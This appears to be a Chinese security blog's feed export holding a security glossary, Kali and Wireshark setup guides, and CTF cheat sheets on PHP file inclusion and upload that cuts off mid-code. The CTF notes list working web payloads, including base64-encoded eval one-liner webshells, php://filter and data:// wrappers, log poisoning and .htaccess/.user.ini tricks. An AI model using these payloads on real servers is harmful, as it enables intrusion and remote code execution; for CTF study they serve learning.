0);">零信任</font></h3><p><font style="color:rgb(0, 0, 0);">零信任并不是不信任，而是作为一种新的身份认证和访问授权理念，不再以网络边界来划定可信或者不可信，而是默认不相信任何人、网络以及设备，采取动态认证和授权的方式，把访问者所带来的的网络安全风险降到最低。</font></p><h3 id="SDP"><a href="#SDP" class="headerlink" title="SDP"></a><font style="color:rgb(0, 0, 0);">SDP</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Software Defined Perimeter，即软件定义边界，由云安全联盟基于零信任网络提出，是围绕某个应用或某一组应用创建的基于身份和上下文的逻辑访问边界。</font></p><h3 id="Security-as-a-Service"><a href="#Security-as-a-Service" class="headerlink" title="Security as a Service"></a><font style="color:rgb(0, 0, 0);">Security as a Service</font></h3><p><font style="color:rgb(0, 0, 0);">安全即服务，通常可理解为以SaaS的方式，将安全能力交付给客户。</font></p><h3 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a><font style="color:rgb(0, 0, 0);">同态加密</font></h3><p><font style="color:rgb(0, 0, 0);">同态加密是一类具有特殊自然属性的加密方法，此概念是Rivest等人在20世纪70年代首先提出的，与一般加密算法相比，同态加密除了能实现基本的加密操作之外，还能实现密文间的多种计算功能。</font></p><h3 id="量子计算"><a href="#量子计算" class="headerlink" title="量子计算"></a><font style="color:rgb(0, 0, 0);">量子计算</font></h3><p><font style="color:rgb(0, 0, 0);">是一种遵循量子力学规律调控量子信息单元进行计算的新型计算模式，目前已经逐渐应用于加密和通信传输。</font></p><h3 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a><font style="color:rgb(0, 0, 0);">可信计算</font></h3><p><font style="color:rgb(0, 0, 0);">是一项由可信计算组（可信计算集群，前称为TCPA）推动和开发的技术。<br></font><font style="color:rgb(0, 0, 0);">可信计算是在计算和通信系统中广泛使用基于硬件安全模块支持下的可信计算平台，以提高系统整体的安全性。</font></p><h3 id="拟态防御"><a href="#拟态防御" class="headerlink" title="拟态防御"></a><font style="color:rgb(0, 0, 0);">拟态防御</font></h3><p><font style="color:rgb(0, 0, 0);">核心实现是一种基于网络空间内生安全机理的动态异构冗余构造（Dynamic Heterogeneous Redundancy，DHR)，为应对网络空间中基于未知漏洞、后门或病毒木马等的未知威胁，提供具有普适创新意义的防御理论和方法。</font></p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a><font style="color:rgb(0, 0, 0);">区块链</font></h3><p><font style="color:rgb(0, 0, 0);">英文名为blockchain，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”、“全程留痕”、“可以追溯”、“公开透明”、“集体维护”等特征。</font></p><h3 id="远程浏览器"><a href="#远程浏览器" class="headerlink" title="远程浏览器"></a><font style="color:rgb(0, 0, 0);">远程浏览器</font></h3><p><font style="color:rgb(0, 0, 0);">鉴于浏览器往往成为黑客攻击的入口，因此将浏览器部署在远程的一个“浏览器服务器池”中。<br></font><font style="color:rgb(0, 0, 0);">这样一来，这些浏览器所在的服务器跟用户所在环境中的终端和网络是隔离的，从而使得客户所在网络的暴露面大大降低。<br></font><font style="color:rgb(0, 0, 0);">这种服务也类似于虚拟桌面、云手机等产品。</font></p><h3 id="云手机"><a href="#云手机" class="headerlink" title="云手机"></a><font style="color:rgb(0, 0, 0);">云手机</font></h3><p><font style="color:rgb(0, 0, 0);">云手机采用全新的VMI（Virtual Mobile Infrastructure虚拟移动设施，与PC云桌面类似）技术，为员工提供一个独立的移动设备安全虚拟手机，业务应用和数据仅在服务端运行和存储，个人终端上仅做加密流媒体呈现和触控，从而有效保障企业数据的安全性。</font></p><h3 id="风控"><a href="#风控" class="headerlink" title="风控"></a><font style="color:rgb(0, 0, 0);">风控</font></h3><p><font style="color:rgb(0, 0, 0);">也称大数据风控，是指利用大数据分析的方法判断业务可能存在的安全风险，目前该技术主要用于金融信贷领域，防止坏账的发生。</font></p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a><font style="color:rgb(0, 0, 0);">渗透测试</font></h3><p><font style="color:rgb(0, 0, 0);">为了证明网络防御按照预期计划正常运行而提供的一种机制，通常会邀请专业公司的攻击团队，按照一定的规则攻击既定目标，从而找出其中存在的漏洞或者其他安全隐患，并出具测试报告和整改建议。<br></font><font style="color:rgb(0, 0, 0);">其目的在于不断提升系统的安全性。</font></p><h3 id="安全众测"><a href="#安全众测" class="headerlink" title="安全众测"></a><font style="color:rgb(0, 0, 0);">安全众测</font></h3><p><font style="color:rgb(0, 0, 0);">借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。<br></font><font style="color:rgb(0, 0, 0);">您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。<br></font><font style="color:rgb(0, 0, 0);">同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。</font></p><h3 id="内生安全"><a href="#内生安全" class="headerlink" title="内生安全"></a><font style="color:rgb(0, 0, 0);">内生安全</font></h3><p><font style="color:rgb(0, 0, 0);">由奇安信集团董事长齐向东在2019北京网络安全大会上首次提出，指的是不断从信息化系统内生长出的安全能力，能伴随业务的增长而持续提升，持续保证业务安全。<br></font><font style="color:rgb(0, 0, 0);">内生安全有三个特性，即依靠信息化系统与安全系统的聚合、业务数据与安全数据的聚合以及IT人才和安全人才的聚合，从信息化系统的内部，不断长出自适应、自主和自成长的安全能力。</font></p><h3 id="内生安全框架"><a href="#内生安全框架" class="headerlink" title="内生安全框架"></a><font style="color:rgb(0, 0, 0);">内生安全框架</font></h3><p><font style="color:rgb(0, 0, 0);">为推动内生安全的落地，奇安信推出了内生安全框架。<br></font><font style="color:rgb(0, 0, 0);">该框架从顶层视角出发，支撑各行业的建设模式从“局部整改外挂式”，走向“深度融合体系化”；从工程实现的角度，将安全需求分步实施，逐步建成面向未来的安全体系；内生安全框架能够输出实战化、体系化、常态化的安全能力，构建出动态防御、主动防御、纵深防御、精准防护、整体防控、联防联控的网络安全防御体系。<br></font><font style="color:rgb(0, 0, 0);">内生安全框架包含了总结出了29个安全区域场景和 79类安全组件。</font></p><h3 id="PPDR"><a href="#PPDR" class="headerlink" title="PPDR"></a><font style="color:rgb(0, 0, 0);">PPDR</font></h3><p><font style="color:rgb(0, 0, 0);">英文全称为Policy Protection Detection Response，翻译为策略、防护、检测和响应。<br></font><font style="color:rgb(0, 0, 0);">主要以安全策略为核心，通过一致性检查、流量统计、异常分析、模式匹配以及基于应用、目标、主机、网络的入侵检查等方法进行安全漏洞检测。</font></p><h3 id="CARTA"><a href="#CARTA" class="headerlink" title="CARTA"></a><font style="color:rgb(0, 0, 0);">CARTA</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Continuous Adaptive Risk and Trust Assessment，即持续自适应风险与信任评估旨在通过动态智能分析来评估用户行为，放弃追求完美的安全，不能要求零风险，不要求100%信任，寻求一种0和1之间的风险与信任的平衡。<br></font><font style="color:rgb(0, 0, 0);">CARTA战略是一个庞大的体系，其包括大数据、AI、机器学*、自动化、行为分析、威胁检测、安全防护、安全评估等方面。</font></p><h3 id="SASE"><a href="#SASE" class="headerlink" title="SASE"></a><font style="color:rgb(0, 0, 0);">SASE</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Secure Access Service Edge，即安全访问服务边缘，Gartner将其定义为一种基于实体的身份、实时上下文、企业安全&#x2F;合规策略，以及在整个会话中持续评估风险&#x2F;信任的服务。<br></font><font style="color:rgb(0, 0, 0);">实体的身份可与人员、人员组（分支办公室）、设备、应用、服务、物联网系统或边缘计算场地相关联。</font></p><h3 id="SDL"><a href="#SDL" class="headerlink" title="SDL"></a><font style="color:rgb(0, 0, 0);">SDL</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Security Development Lifecycle，翻译为安全开发生命周期，是一个帮助开发人员构建更安全的软件和解决安全合规要求的同时降低开发成本的软件开发过程，最早由微软提出。</font></p><h3 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a><font style="color:rgb(0, 0, 0);">DevSecOps</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Development Security Operations，可翻译为安全开发与运维。<br></font><font style="color:rgb(0, 0, 0);">它强调在DevOps计划刚启动时就要邀请安全团队来确保信息的安全性，制定自动安全防护计划，并贯穿始终，实现持续 IT 防护。</font></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><font style="color:rgb(0, 0, 0);">代码审计</font></h3><p><font style="color:rgb(0, 0, 0);">顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。</font></p><h3 id="NTLM验证"><a href="#NTLM验证" class="headerlink" title="NTLM验证"></a><font style="color:rgb(0, 0, 0);">NTLM验证</font></h3><p><font style="color:rgb(0, 0, 0);">NTLM(NT LAN Manager)是微软公司开发的一种身份验证机制，从NT4开始就一直使用，主要用于本地的帐号管理。</font></p><h3 id="MTTD"><a href="#MTTD" class="headerlink" title="MTTD"></a><font style="color:rgb(0, 0, 0);">MTTD</font></h3><p><font style="color:rgb(0, 0, 0);">平均检测时间。</font></p><h3 id="MTTR"><a href="#MTTR" class="headerlink" title="MTTR"></a><font style="color:rgb(0, 0, 0);">MTTR</font></h3><p><font style="color:rgb(0, 0, 0);">平均响应时间。</font></p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a><font style="color:rgb(0, 0, 0);">CVE</font></h3><p><font style="color:rgb(0, 0, 0);">全称Common Vulnerabilities and Exposures，由于安全机构Mitre维护一个国际通用的漏洞唯一编号方案，已经被安全业界广泛接受的标准。</font></p><h3 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a><font style="color:rgb(0, 0, 0);">软件加壳</font></h3><p><font style="color:rgb(0, 0, 0);">“壳”是一段专门负责保护软件不被非法修改或反编译的程序。<br></font><font style="color:rgb(0, 0, 0);">它们一般都是先于程序运行，拿到控制权，然后完成它们保护软件的任务。<br></font><font style="color:rgb(0, 0, 0);">经过加壳的软件在跟踪时已无法看到其真实的十六进制代码，因此可以起到保护软件的目的。</font></p><h3 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a><font style="color:rgb(0, 0, 0);">CNVD</font></h3><p><font style="color:rgb(0, 0, 0);">国家信息安全漏洞共享平台，由国家计算机应急响应中心CNCERT维护，主要负责统一收集、管理国内的漏洞信息，其发布的漏洞编号前缀也为CNVD。</font></p><h3 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a><font style="color:rgb(0, 0, 0);">数据脱敏</font></h3><p><font style="color:rgb(0, 0, 0);">数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。</font></p><h3 id="GDPR"><a href="#GDPR" class="headerlink" title="GDPR"></a><font style="color:rgb(0, 0, 0);">GDPR</font></h3><p><font style="color:rgb(0, 0, 0);">《通用数据保护条例》（General Data Protection Regulation，简称GDPR）为欧洲联盟的条例，前身是欧盟在1995年制定的《计算机数据保护法》。</font></p><h3 id="CCPA"><a href="#CCPA" class="headerlink" title="CCPA"></a><font style="color:rgb(0, 0, 0);">CCPA</font></h3><p><font style="color:rgb(0, 0, 0);">美国加利福尼亚州消费者隐私保护法案。</font></p><h3 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a><font style="color:rgb(0, 0, 0);">SRC</font></h3><p><font style="color:rgb(0, 0, 0);">即Security Response Center，中文名为安全应急响应中心，主要职责为挖掘并公开收集机构存在的漏洞和其他安全隐患。</font></p><h3 id="CISO"><a href="#CISO" class="headerlink" title="CISO"></a><font style="color:rgb(0, 0, 0);">CISO</font></h3><p><font style="color:rgb(0, 0, 0);">有时也被叫做CSO，即首席信息安全官，为机构的主要安全负责人。</font></p><h3 id="IPC管道"><a href="#IPC管道" class="headerlink" title="IPC管道"></a><font style="color:rgb(0, 0, 0);">IPC管道</font></h3><p><font style="color:rgb(0, 0, 0);">为了更好地控制和处理不同进程之间的通信和数据交换，系统会通过一个特殊的连接管道来调度整个进程。</font></p><h3 id="SYN包"><a href="#SYN包" class="headerlink" title="SYN包"></a><font style="color:rgb(0, 0, 0);">SYN包</font></h3><p><font style="color:rgb(0, 0, 0);">TCP连接的第一个包，非常小的一种数据包。SYN攻击包括大量此类的包，由于这些包看上去来自实际不存在的站点，因此无法有效进行处理。</font></p><h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a><font style="color:rgb(0, 0, 0);">IPC$</font></h3><p><font style="color:rgb(0, 0, 0);">是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</font></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a><font style="color:rgb(0, 0, 0);">shell</font></h3><p><font style="color:rgb(0, 0, 0);">指的是一种命令指行环境，是系统与用户的交换方式界面。简单来说，就是系统与用户“沟通”的环境。<br></font><font style="color:rgb(0, 0, 0);">我们平时常用到的DOS，就是一个shell。（Windows2000是cmd.exe）</font></p><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a><font style="color:rgb(0, 0, 0);">ARP</font></h3><p><font style="color:rgb(0, 0, 0);">地址解析协议(Address Resolution Protocol)此协议将网络地址映射到硬件地址。</font></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali更换国内镜像源教程</title>
      <link href="/2024/12/13/Kali_%E5%A6%82%E4%BD%95%E6%9B%B4%E6%8D%A2%E6%BA%90%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%8C%E9%99%84%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90%E5%9C%B0%E5%9D%80%EF%BC%89/"/>
      <url>/2024/12/13/Kali_%E5%A6%82%E4%BD%95%E6%9B%B4%E6%8D%A2%E6%BA%90%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%8C%E9%99%84%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90%E5%9C%B0%E5%9D%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(51, 51, 51);">可以直接打开这个目录 &#x2F;etc&#x2F;apt&#x2F; 并找到 sources.</font><font style="color:rgb(0, 0, 255);">list</font><font style="color:rgb(51, 51, 51);"> 文件，直接打开。</font></p><p><font style="color:rgb(51, 51, 51);">或者用控制台</font><font style="color:rgb(0, 0, 255);">命令：</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.<span class="property">list</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);background-color:rgb(245, 245, 245);"></font></p><p>打开，用控制台要复杂一些，得用 i 按键进入插入模式才可以编辑，编辑完成后，按ESC退出插入模式，并输入:wq! 保存并退出。</p><p><strong><font style="color:rgb(0, 0, 255);">那么要编辑什么呢：</font></strong></p><p><font style="color:rgb(0, 0, 255);">先用 # 把原本的注释掉或者删除：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/27497895/1727059352518-3d628b0a-6684-49cb-b1e2-694b21a03609.png"></p><p><font style="color:rgb(51, 51, 51);">之后，在下面添加上新的源：</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="attr">http</span>:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src <span class="attr">http</span>:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="attr">http</span>:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src <span class="attr">http</span>:<span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">#deb <span class="attr">http</span>:<span class="comment">//mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span></span><br><span class="line">#deb-src <span class="attr">http</span>:<span class="comment">//mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free&lt;br&gt;&lt;br&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="attr">http</span>:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb-src <span class="attr">https</span>:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="attr">http</span>:<span class="comment">//http.kali.org/kali kali-rolling main non-free contrib </span></span><br><span class="line">deb-src <span class="attr">http</span>:<span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#deb <span class="attr">http</span>:<span class="comment">//security.kali.org/kali-security kali-rolling/updates main contrib non-free</span></span><br><span class="line">#deb-src <span class="attr">http</span>:<span class="comment">//security.kali.org/kali-security kali-rolling/updates main contrib non-free</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">上面为大家准备了阿里云、中科大、官方源。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/27497895/1727061735462-12a62673-70a5-43d3-8b16-893b0974b15a.png">我这边我自己使用的是阿里云，大家可以根据需求更换不同的源</p><p><strong><font style="color:rgb(51, 51, 51);">更换国内源肯定是快得多的，之后需要更新系统或更新软件可以使用以下指令：</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更新更新源：</span></span><br><span class="line">apt-get update </span><br><span class="line"><span class="comment">//更新系统：</span></span><br><span class="line">apt-get dist-upgrade </span><br><span class="line"><span class="comment">//更新软件：</span></span><br><span class="line">apt-get upgrade </span><br><span class="line"><span class="comment">//清理安装包：</span></span><br><span class="line">apt-get clean </span><br><span class="line">apt-get autoclean </span><br><span class="line"><span class="comment">//安装KDE界面：</span></span><br><span class="line">apt-get install kde-full </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark的保姆级安装教程</title>
      <link href="/2024/12/13/Wireshark%E7%9A%84%E4%BF%9D%E5%A7%86%E7%BA%A7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/13/Wireshark%E7%9A%84%E4%BF%9D%E5%A7%86%E7%BA%A7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>在CTF比赛中或者是抓包中我们都会用到一个工具Wireshark，但是有很多小伙伴们刚入门安全，不知道该如何去安装这个wireshark，今天我就来教大家如何安装wireshark <img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231405386.png" alt="image-20241213231358106">首先我们可以去getshell极核网站直接去下载wireshark，本人自从发现这个网站后一直都是在这边下的工具（有无后门自测）。<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231438858.png" alt="image-20241213231438667">在下边水一下就可以获得下载链接，因为我是站长送的会员所以可以直接下载，我们等待下载结束即可（但是我发现水一下居然比我这个会员下载的更快）<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231445565.png" alt="image-20241213231445496"></p><p>如果之前下载过就会显示是否要先将它卸载，选择是</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231450352.png" alt="image-20241213231450261"></p><p>点击下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231453666.png" alt="image-20241213231453541"></p><p>点击noted</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231457097.png" alt="image-20241213231456977"></p><p>继续点击下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231500131.png" alt="image-20241213231500038">这边也不需要勾选，直接下一步，默认配置即可<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231502978.png" alt="image-20241213231502888"></p><p>我们这边仍然选择默认配置即可（新手可以全部勾选，因为勾选了会有快捷方式，这样直接显示在桌面上）<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231506557.png" alt="image-20241213231506448">然后我们把他安装到我们指定的文件夹中即可<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231509718.png" alt="image-20241213231509622"></p><p>继续下一步<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231512679.png" alt="image-20241213231512590"></p><p>然后我们只要等待安装就可以了<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231515737.png" alt="image-20241213231515561">至此我们的wireshark安装就到此结束了<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241213231518973.png" alt="image-20241213231518771">后续就继续学习wireshark的使用吧~</p><p>安全之路还很长，需要大家持之以恒的不断学习~</p>]]></content>
      
      
      <categories>
          
          <category> 实用工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-文件包含</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="写在开头可能会用到的提醒"><a href="#写在开头可能会用到的提醒" class="headerlink" title="写在开头可能会用到的提醒"></a>写在开头可能会用到的提醒</h1><h2 id="提醒"><a href="#提醒" class="headerlink" title="提醒"></a>提醒</h2><ul><li><strong>文件包含可以使用绝对路径，例如?file&#x3D;&#x2F;flag</strong></li></ul><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ul><li><strong>遇到文件包含(include)首先想到伪协议,filter,data,input,zip等</strong></li><li></li><li><strong>读取文件，base64编码</strong></li><li><strong>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;</strong></li><li><strong>读取文件，将读取到的文件中的字母往后ASCII+13，如果不足+13便会-13,例如ctfshow变为pgsfubj</strong></li><li><strong>php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</strong></li><li><strong>convert.iconv.* 过滤器，更多看文章底部链接</strong></li><li><strong>例如：php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.SJIS*.UCS-4*&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</strong></li><li></li><li><strong>例如：include “php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;”</strong></li><li><strong>data伪协议,data:&#x2F;&#x2F;text&#x2F;plain,&lt;php代码&gt;</strong></li><li></li><li><strong>例如：include “data:&#x2F;&#x2F;text&#x2F;plain,<?=phpinfo();?>“</strong></li><li><strong>data伪协议第二种写法，data:&#x2F;&#x2F;text&#x2F;plain;base64,base代码</strong></li><li><strong>例如：include “data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbCgkX0dFVFtjbWRdKTs&#x2F;Pg&#x3D;&#x3D;”</strong></li><li></li><li><strong>input,php:&#x2F;&#x2F;input,post输入php代码</strong></li><li><strong>例如：include “php:&#x2F;&#x2F;input” 然后post输入代码</strong></li><li></li><li><strong>日志注入，将UA修改为一句话马，然后包含住日志文件，然后执行</strong></li><li><strong>例如：在UA等之类的输入php代码，然后包含include “&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log”</strong></li><li></li><li><strong>远程包含，即包含url，需要php.ini开启配置，allow_url_fopen &#x3D; On（默认开启），allow_url_include &#x3D; On （默认关闭）</strong></li><li><strong>例如?file&#x3D;<a href="http://baidu.com/">http://baidu.com</a></strong></li><li></li><li><strong>phar,phar:&#x2F;&#x2F;压缩包路径&#x2F;压缩包里面的文件</strong></li><li><strong>例如shell.zip里面有shell.php，phar:&#x2F;&#x2F;shell.zip&#x2F;shell.php</strong><ul><li></li></ul></li><li><strong>file_put_contents($file,$content)写入文件，$file将$content的内容base64decode放入1.php</strong></li><li><strong>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php | content&#x3D;PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7ID8%2B</strong></li></ul><h2 id="过滤器相关"><a href="#过滤器相关" class="headerlink" title="过滤器相关"></a>过滤器相关</h2><ul><li><strong>使用php:&#x2F;&#x2F;filter&#x2F;过滤器&#x2F;resource&#x3D;来读取文件，这边过滤器有很多</strong></li><li><strong>相关文章: <a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></strong></li><li><strong>相关文章: <a href="https://www.jianshu.com/p/0a8339fcc269">https://www.jianshu.com/p/0a8339fcc269</a></strong></li></ul><p><strong>做题用过的过滤器</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.EUC-JP*.UCS-4*</span><br><span class="line">convert.iconv.SJIS*.UCS-4*</span><br></pre></td></tr></table></figure><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绝对路径 file:///flag</span><br><span class="line">相对路径 file://../../flag</span><br></pre></td></tr></table></figure><h3 id="input协议"><a href="#input协议" class="headerlink" title="input协议"></a>input协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;php://input&quot;</span><br><span class="line">如果这样子的话，可以POST直接传入POHP代码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-文件上传</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="开头可能会用到的提示"><a href="#开头可能会用到的提示" class="headerlink" title="开头可能会用到的提示"></a>开头可能会用到的提示</h1><ul><li><p><strong>除了PHP，php3 4 5 | phar | pht | phtml都是可能会解析的</strong></p></li><li><p><strong>如果是apache(httpd) , 使用.htaccess 写入SetHandler application&#x2F;x-httpd-php , 那么上传任意文件会被解析成php</strong></p></li><li><p><strong>如果是apache(httpd) , 使用.htaccess， 写入AddType application&#x2F;x-httpd-php .jpg 会把当前目录的jpg当成php解析</strong></p></li><li><p><strong>nginx，使用.user.ini 写入(当前目录有php文件才会生效)，auto_prepend_file&#x3D;shell.jpg或者auto_append_file&#x3D;shell.jpg，上传shell.jpg被解析为php</strong></p></li><li><p><strong>.user.ini, auto_prepend_file&#x3D;php:&#x2F;&#x2F;input | auto_append_file&#x3D;php:&#x2F;&#x2F;input，也可以这样写，上传后访问上传目录的php里面，POST传入php代码</strong></p></li><li><p><strong>auto_prepend_file | auto_append_file也可以尝试包含日志，直接日志注入</strong></p></li><li><p><strong>getimagesize绕过，如果使用了这个检测函数，可以在文件头写入下面的代码，让这个函数认为上传的文件是jpg</strong></p><p>#define width 114<br>#define height 514</p></li><li><p><strong>[]被检测可以使用{}</strong></p></li><li><p><strong>eval($_POST[cmd]); 如果$_POST[cmd]用不了，可以array_pop($_POST),然后 post随便传入值即可</strong></p></li><li><p><strong>利用语言结构，使用include包含日志文件</strong></p></li><li><p><strong>如果空格被过滤，使用\n也就是0d，改十六进制数据</strong></p></li><li><p><strong>include远程包含</strong></p></li></ul><h1 id="一些总结点"><a href="#一些总结点" class="headerlink" title="一些总结点"></a>一些总结点</h1><h2 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a>pear文件包含</h2><p>首先生成一个phar文件，执行下面的php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">$phar -&gt; 